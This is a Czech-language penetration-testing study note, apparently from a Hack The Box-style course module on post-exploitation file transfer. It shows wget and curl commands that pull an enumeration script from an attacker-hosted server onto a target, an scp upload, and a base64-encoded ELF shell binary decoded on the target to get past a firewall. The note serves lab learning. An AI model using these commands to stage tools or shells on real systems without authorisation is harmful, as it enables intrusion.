---
{"dg-publish":true,"permalink":"/hacking/transferring-files/","dg-note-properties":{"Created":"2026-05-05T15:40","Module":"Post-Exploitation"}}
---

- na posílaní souborů na remote server např. enumeration scriptů nebo exploitů

### Možnosti

#### Wget

- spustíme python http server na našem zařízení

```bash
python3 -m http.server 8000
```

- z cíle stáhneme soubor pomocí wget nebo cURL

```bash
wget http://10.10.14.1:8000/linenum.sh
```

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

- `-o` - output soubor
#### SCP

- pokud máme ssh user credentials na targetu

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

- `linenum.sh` - local file name

- `/tmp/linenum.sh` - kam se soubor uloží na targetu

#### Base64

- pokud má server firewall

- encodneme soubor do base64

```bash
base64 <SOUBOR> -w 0
```

- na targetu následně soubor dekódujeme

```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > <OUTPUT SOUBOR>
```

- `file shell` - na validaci formátu souboru

- na zkontrolování integrity souboru můžeme použít `md5sum`

```bash
GRAV1TYY@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

```bash
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
